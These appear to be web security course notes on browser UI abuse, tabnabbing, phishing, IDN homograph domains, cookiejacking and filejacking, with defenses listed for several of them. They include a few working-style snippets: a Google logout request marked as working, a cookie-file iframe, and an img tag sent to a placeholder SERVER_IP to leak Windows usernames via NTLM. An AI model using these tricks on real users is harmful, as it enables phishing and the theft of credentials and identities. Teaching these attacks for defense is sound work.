### Denial-of-service, Phishing, Side Channels

### UI Denial-of-service attacks
- Override browser defaults: disorient or trap the user on site
- Scareware: sites which intimidate the user into buying a product by trapping them on an unwanted site
- Annoy the user: harmless fun, can be disruptive, cause users to lose unsaved work

|API Level | Restrictions | Examples |
|-----------|--------------|-------------|
| Level 0 | No restrictions. API can be used immediately and indiscriminately.|DOM, CSS, window.move(), file download, hide mouse cursor|
| Level 1 | User interaction required. API cannot be used except in response to a “user activation” (e.g. click, keypress).|Element.requestFullscreen(), navigator.vibrate(), copy text to clipboard, speech synthesis API, window.open()|
| Level 2 | User “engagement” required. API can- not be used until user demonstrates high engagement with a website.|Autoplay sound, prompt to install website to homescreen|
| Level 3 | User permission required. API cannot be used until user grants explicit permission.|Camera, microphone, geolocation, USB, MIDI device access|


### Weird Things you can do with Browser API
- Classic infinite alert loop
    - Defenses:
        - Goal: Browsers want to give users a way to break out of infinite alert loops without needing to quit their browser
        - Initial solution: Browsers added a checkbox on alert modal to stop further alerts
        - Current solution: Browsers are multiprocess now, so if a tab wants to go into an infinite loop that doesn't prevent the tab's close button from working. Just let the site infinitely loop as long as the user can close the misbehaving tab
- window.open()
- win.moveTo(10, 10)
- win.resizeTo(200, 200)
- Intercept all user-initiated events
- Open child window
- Focus all windows on click
- Bounce window off the screen edges
- Play random video in the window
- Show a modal to prevent window close
- Disable the back button
- Fill the history with extra entries
- Copy spam to clipboard
- Register protocol handlers
- Request camera and mic
- Start vibrate interval
- Start a picture-in-picture video
- Hide the cursor
- Trigger a file download
- Fullscreen browser
- Log user out of popular sites
    - 'Google': ['GET', 'https://www.google.com/accounts/Logout'], // works!
- Do embarrassing searches 
- Tabnabbing[^tab]
    - Tabnabbing defenses
        - Add rel='noopener' to all links with target='_blank' to prevent this attack
        - The opened site's window.opener will be null
        - New HTTP header: Cross-Origin-Opener-Policy: same-origin
        - Browsers will use a separate OS process to load the site
        - Prevent cross-window attacks (window.opener, usage of postMessage) and process side-channel attacks by severing references to other browsing contexts

### What should a web browser be?
- Simple document viewer or powerful app platform?
    - There's a inherent tension between the two goals
    - Need to give developers powerful features without letting the bad ones be user-hostile (i.e. fingerprinting, phishing)

### Phishing
- Acting like a reputable entity to trick the user into divulging sensitive information such as login credentials or account information
- Often easier than attacking the security of a system directly
    - Just get the user to tell you their password

### Internationalized Domain Names (IDN)
- Hostnames containing Unicode characters are transcoded to subset of ASCII consisting of letters, digits, and hyphens called punycode
- Punycode is a representation of Unicode with the limited ASCII character subset used for Internet host names
- Allows registering domains with foreign characters!
    - münchen.example.com→xn--mnchen-3ya.example.com
    - Ꭸ.co→xn--s7y.co

### What's going on?
- Many Unicode characters are difficult to distinguish from common ASCII characters
- Can you spot the difference?
    - аpple.com vs. apple.com
- If you convert all hostnames to punycode, then it becomes obvious
    - аpple.com→xn--pple-43d.com

### IDN homograph attack
- Akin to "domain typosquatting"
    - Use similar-looking name to an established domain to fool a user
- Handwriting has this issue too
    - See etymology of the word "zenith". The translation from the Arabic "samt" (direction) included the scribe's confusing of "m" into "ni"
- Some typefaces still have the issue ("rn" vs. "m" vs. "rri")

### IDN homograph attack defenses
- Solution: Punycode will show if domain contains characters from multiple different languages
- Workaround: Replace every character with a lookalike from a single foreign language
    - аррӏе.com→xn--80ak6aa92e.com
- Updated solution: Show punycode when entire domain is made of lookalike characters and the top-level-domain is not IDN itself.
- Won't fool a password manager!

### Picture-in-picture attack
- Show a picture of a browser window with trust indicators for the victim website within the attacker page
- "We found that picture-in-picture attacks showing a fake browser window were as effective as the best other phishing technique, the homograph attack. Extended validation did not help users identify either attack"1

### User defenses against phishing
- Use a password manager
- Password manager won't be fooled by IDN homograph attack
- Use a hardware security key

### Cookiejacking
- Famous example affected IE in 2011.
`<iframe src="file://C:/Users/%user%/AppData/Roaming/Microsoft/Windows/Cookies/%user%@google[1].txt">`
- Use clickjacking technique to perform "content extraction" using Drag-and-Drop
- Learn Windows username by adding `<img src="\\SERVER_IP\img.jpg">` to page, wait for NTLM (New Technology LAN Manager) protocol to send username in the clear to SERVER_IP
- Select the whole cookie text with mousedown using two nested iframes

### Filejacking
- Make users think that a file upload dialog is actually a file download dialog
- Get them to upload the entire contents of a folder to your server

### User interface security
- "UI security attacks ... are fundamentally attacks on human perception"
- Core problem: Browser allows untrusted sites to put content in a place where the user looks to make trust decisions

### Google Safe Browsing

- Google maintains a list of known malware/phishing URLs
- Idea: Browser queries the list on every navigation
    - Would send real-time browsing history to Google
- Idea: Download full list of URLs to browser
    - Would be huge, and it's constantly changing
- Idea: Do something smarter?


### Further Reading

theannoyingsite.com

https://testsafebrowsing.appspot.com/

https://arxiv.org/pdf/1708.08510.pdf

https://www.xudongz.com/blog/2017/idn-phishing/

http://www.smbc-comics.com/index.php?db=comics&id=2526

https://sites.google.com/site/tentacoloviola/cookiejacking

https://www.usenix.org/system/files/conference/usenixsecurity13/sec13-paper_akhawe.pdf

http://www.sectheory.com/clickjacking.htm

https://www.adambarth.com/papers/2009/barth-weinberger-song.pdf

[^tab]:https://en.wikipedia.org/wiki/Tabnabbing
